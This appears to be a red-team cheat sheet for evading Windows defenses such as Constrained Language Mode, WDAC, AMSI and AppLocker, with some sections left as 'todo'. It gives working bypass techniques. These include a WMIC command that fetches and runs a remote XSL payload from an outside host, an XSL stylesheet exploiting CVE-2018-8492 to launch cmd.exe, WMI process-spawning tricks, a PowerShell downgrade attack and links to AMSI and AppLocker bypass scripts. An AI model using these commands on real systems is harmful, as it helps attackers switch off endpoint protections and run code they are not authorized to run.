***********************************************************************************************
						Useful Resources
***********************************************************************************************

Awesome tool for restricted env. evasion:
	https://github.com/Cn33liz/p0wnedLoader
	https://rastamouse.me/2018/05/csharp-dotnettojscript-xsl/
	
More:

	https://bohops.com/2019/01/10/com-xsl-transformation-bypassing-microsoft-application-control-solutions-cve-2018-8492/

	https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html

	https://oddvar.moe/

	https://www.fortynorthsecurity.com/building-a-windows-defender-application-control-lab/

	https://posts.specterops.io/threat-detection-using-windows-defender-application-control-device-guard-in-audit-mode-602b48cd1c11

	https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/

	https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/evaluate-windows-defender-exploit-guard

	http://www.exploit-monday.com/2018/06/device-guard-and-application.html

	https://lolbas-project.github.io/#

***********************************************************************************************
					Evade Detection and/or Restricted Environments
***********************************************************************************************

WMI Class Derivation (Evasion) with no "win32" prefix:
	$C = [WmiClass] '/root/cimv2:Win32_Process'
	$N = $C.derive('MyEvilProcess')
	$N.Put()
	Invoke-WmiMethod MyEvilProcess -Name CrEaTe -ArgumentList calc.exe

PowerShell without PowerShell + restricted env. escaping through WMIC XSL payload execution:
	C:\Windows\System32\WMIC.exe os get /format:"https://tatamaster.lol/p0wnedLoader/p0wnedLoader.xsl"

***********************************************************************************************
						Mitigation Bypass
***********************************************************************************************
	

			#################################
			/		Testing environment					 /
			/   Windows 10 Version:1803,  O.S build 17134.523   /
			#################################


-----------------------------------------------------
Constrained Language Mode (CLM) 
-----------------------------------------------------

Identification:
	In PowerShell: $ExecutionContext.SessionState.LanguageMode
		Active: ConstrainedLanguage
		Inactive: FullLanguage 
	
	Error message: todo

Bypass:
		1) $ExecutionContext.SessionState.LanguageMode = "FullLanguage"
		2) PowerShell downgrade attack (require psh v2) : "PowerShell -Version 2 -Command <...>" 
		3) wmic.exe process call create powershell.exe (usable remotely)
		
Resources:
	P0wnedShell by Cn33liz: https://github.com/Cn33liz/p0wnedShell
		
----------------------------------------------------------------------
Windows Defender Application Control (WDAC)
----------------------------------------------------------------------

Identification: todo

Error message: todo

Bypass:
	- CVE-2018-8492 (WDAC Bypass via COM XSLT):
		1) Find available COM object:	
			$ErrorActionPreference = "SilentlyContinue"
			$ids = gwmi Win32_COMSetting | ?{ $_.ProgId -ne $null }
			$ids | ForEach {if (new-object -com $_.ProgID){$_.ProgID}}
	
	- WDAC using default policy:
		2) Store payload in XML file:
			<?xml version='1.0'?>
				<stylesheet
				xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
				xmlns:user="placeholder"
				version="1.0">
				<output method="text"/>
					<ms:script implements-prefix="user" language="JScript">
						<![CDATA[
							var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
						]]> </ms:script>
				</stylesheet>
		
		3) Execute following PowerShell code:
			$xsl = new-object -ComObject Microsoft.XMLDOM.1.0
			$xsl.load("c:\path\to\minimalist.xml")
			$xsl.transformNode($xsl)
			
Resources:
	https://bohops.com/2019/01/10/com-xsl-transformation-bypassing-microsoft-application-control-solutions-cve-2018-8492/
		
-----------------------------------------------------
Antimalware Scan Interface (AMSI)
-----------------------------------------------------

Identification: todo
	
Error message: todo


Bypass:
	https://github.com/kmkz/PowerShell/blob/master/amsi-bypass.ps1
	
Resources:
	https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/ (Best because more recent technique)
	https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html
	
----------------------------------------
AppLocker demystification
----------------------------------------

	"When whitelisting policies are enforced, PowerShell CLM is applied in AppLocker (for users in "Allowed Mode") and WDAC (for users and administrators)."

Identification: todo

Error message: todo

Bypass:
	1) use p0wnedShell via .xsl file + encryption (for Defender Bypass) https://github.com/Cn33liz/p0wnedLoader for payload delivery (WMI)
		Example: C:\Windows\System32\wbem\WMIC.exe os get /format:"https://tatamaster/p0wnedLoader.xsl"
		
	2) https://github.com/kmkz/PowerShell/blob/master/Semi-interactive-shell-applocker-bypass.ps1

Resources:	
	P0wnedShell by Cn33liz: https://github.com/Cn33liz/p0wnedShell
	AAronLocker: https://blogs.msdn.microsoft.com/aaron_margosis/2018/06/26/announcing-application-whitelisting-with-aaronlocker/
	https://www.slideshare.net/OddvarHlandMoe/appolockalypse-now
	https://github.com/api0cradle/UltimateAppLockerByPassList
		
---------------------------------------------------------------------------------------------------------------------------------------------------
Windows Lockdown Policy (WLDP aka Device Guard) with User Mode Code Integrity (UMCI) policy
---------------------------------------------------------------------------------------------------------------------------------------------------

Definition:
	When "enforced" by AppLocker policy, CLM COM object instantiation is very open. 
	In essence, (m)any COM object can be instantiated by default when WLDP is not active.
	Under WDAC with UMCI, the WLDP greatly reduces this number (between 8 to 50 COM objects according to James Forshaw of Google Project Zero in this .NET COM Instantiation UMCI bypass disclosure write-up linked in "Resources" part).

Identification: todo

Error message: todo

Bypass: todo

Resources:
	https://bugs.chromium.org/p/project-zero/issues/detail?id=1514 (fixed on 5/08/2018)
	
---------------------------------------------------
Software Restriction Policies (SRP)
---------------------------------------------------

Identification: todo

Error message: todo

Bypass: todo

Resources: todo
	
-----------------------------------------------------------------------------------
Application Identify Service (Process name: AppIDSvc)
-----------------------------------------------------------------------------------

Definition:
	The Application Identity service determines and verifies the identity of an app. 
	Stopping this service will prevent AppLocker policies from being enforced.

	Important: 
		When using Group Policy, you must configure it to start automatically in at least one Group Policy Object (GPO) that applies AppLocker rules. 
		This is because AppLocker uses this service to verify the attributes of a file.

Identification:
	Get-Service appidsvc 
	
	Error message: todo


Bypass: todo